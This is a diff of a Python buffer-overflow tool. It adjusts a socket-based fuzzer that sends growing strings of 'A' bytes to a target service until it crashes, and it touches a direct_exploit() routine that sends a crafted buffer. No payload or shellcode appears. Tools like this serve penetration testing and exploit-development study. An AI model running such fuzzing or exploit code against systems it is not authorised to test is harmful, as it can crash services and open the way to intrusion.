@@ -106,14 +106,14 @@ def set_novul_inputs():
 
 
 def program_input_handling(s, buffer):
-    s.send(bytes(buffer+'\\r\\n', "latin-1"))
+    s.send(bytes(buffer + '\r\n', "latin-1"))
 
 
 def program_input_handling_prev(s):
 
     for pi in prevs_ar:
-        s.send(bytes(pi+'\\r\\n', "latin-1"))
-        s.recv(1024)
+        s.send(bytes(pi+'\r\n', "latin-1"))
+        #s.recv(1024)
 
 ########################################### ------ FUZZING ------###########################################
 
@@ -130,8 +130,7 @@ def fuzzer():
     fuzz_type = '1'       # 1 for automatic & 2 for manual
 
     while fuzz_type:
-        print("""
-Do you want to do?\n
+        print("""Do you want to do?\n
     [1] Automatic Fuzzing (Default) : Handled by the program through incrementing the 100 bytes in each loop
     [2] Manual Fuzzing              : You have to give the rough offset value.
         """)
@@ -155,7 +154,7 @@ Do you want to do?\n
         string = prefix + "A" * 100
 
     timeout = 5
-
+    
     while True:
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -174,20 +173,18 @@ Do you want to do?\n
 
                 s.settimeout(timeout)
                 s.connect((ip, port))
-
-                s.recv(1024)
-                print("Fuzzing with {} bytes".format(
-                    len(string) - len(prefix)))
+               
+                print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
 
                 program_input_handling_prev(s)
 
                 program_input_handling(s, string)
+                
                 s.recv(1024)
-        except:
-            print("Fuzzing crashed at {} bytes".format(
-                len(string) - len(prefix)))
-            is_crash = input(
-                BLUE + 'Is your Application Really Crashed? (Y/n) : '+END)
+                
+        except Exception as e:        
+            print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
+            is_crash = input(BLUE + 'Is your Application Really Crashed? (Y/n) : '+END)
             if is_crash.lower() == 'n':
                 continue
             break
@@ -429,7 +426,6 @@ def direct_exploit():
 
         program_input_handling(s, buffer)
 
-        # s.send(bytes(buffer + "\r\n", "latin-1"))
         s.close()
         print("Done!")
     except Exception as e:
